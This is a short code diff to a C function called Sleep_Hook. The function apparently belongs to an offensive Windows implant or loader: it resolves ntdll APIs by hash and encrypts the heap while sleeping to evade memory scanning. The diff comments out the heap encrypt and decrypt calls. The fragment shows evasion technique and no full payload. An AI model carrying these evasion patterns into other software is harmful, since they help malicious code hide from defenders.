@@ -56,7 +56,7 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ ULONG WaitTime )
 	Api.RtlFreeHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
 
 	/* Encrypt the heap */
-	HeapEncryptDecrypt( &Key, sizeof( Key ) );
+	//HeapEncryptDecrypt( &Key, sizeof( Key ) );
 
 	/* Allocate a buffer for the arguments */
 	if ( ( Arg = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, 3 * sizeof( PVOID ) ) ) ) {
@@ -73,7 +73,7 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ ULONG WaitTime )
 	};
 
 	/* Decrypt the heap */
-	HeapEncryptDecrypt( &Key, sizeof( Key ) );
+	//HeapEncryptDecrypt( &Key, sizeof( Key ) );
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
